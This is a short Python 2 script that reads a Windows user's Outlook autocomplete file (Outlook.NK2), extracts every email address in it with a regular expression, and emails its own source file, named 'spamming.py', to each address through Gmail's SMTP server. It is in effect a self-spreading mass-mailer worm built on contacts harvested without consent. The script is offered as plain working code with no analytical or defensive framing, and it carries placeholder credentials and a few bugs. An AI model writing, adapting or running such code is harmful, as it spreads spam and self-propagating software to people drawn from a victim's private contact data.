import os
import re
import string
##email
import time
from email.header import Header
from email.mime.text import MIMEText
from getpass import getpass
from smtplib import SMTP_SSL
from email.MIMEMultipart import MIMEMultipart 
import smtplib
##ENDmail

GLOBALE = 'ok'

def filter(data):
	dd = ""
	for i in data:
		if i in string.printable:
			dd+=i
	return dd

def leggitesto(file):
	with open(filepath,"r") as ff:
		content = ff.read()
	return content

def inviamail(address):
	msg = MIMEMultipart()
	filename = "spamming.py"
	f = file(filename)
	fromaddr = 'asd@gmail.com'
	toaddrs  = address
	#msg = 'There was a terrible error that occured and I wanted you to know!'

	attachment = MIMEText(f.read())
	attachment.add_header('Content-Disposition', 'attachment',   filename=filename)           
	msg.attach(attachment)
	# Credentials (if needed)
	username = 'gamiladdr'
	password = 'passwrd'

	# The actual mail send
	#server = smtplib.SMTP('smtp.gmail.com:587')
	#server = smtplib.SMTP('localhost')
	#server.starttls()
	#server.login(username,password)
	try:
		server = smtplib.SMTP('smtp.gmail.com')
		#server = smtplib.SMTP('smtp.gmail.com:587')
		#server.starttls()
		#server.login(username,password)
		server.sendmail(fromaddr, toaddrs, msg.as_string() )
		server.quit()       
		#print "Spam - Send email OK"
	except:
		print "Spam - Error: unable to send email "
		GLOBALE = 'ko'


#homepath = os.path.expanduser('~user')
homepath = os.path.expanduser(os.getenv('USERPROFILE'))
filepath = homepath+'\\AppData\\Roaming\Microsoft\Outlook\Outlook.NK2'
#filepath = homepath+'\\AppData\\Roaming\Microsoft\Outlook\exp.txt'


with open(filepath,"r") as ff:
	content = ff.read()
#print(content)
#print

data = filter(content)
match = re.findall(r'[\w\.-]+@[\w\.-]+', data)
for im in match:
	inviamail(im)
	#print im

if (GLOBALE == 'ok'):
	print "Spam - Sending mails OK"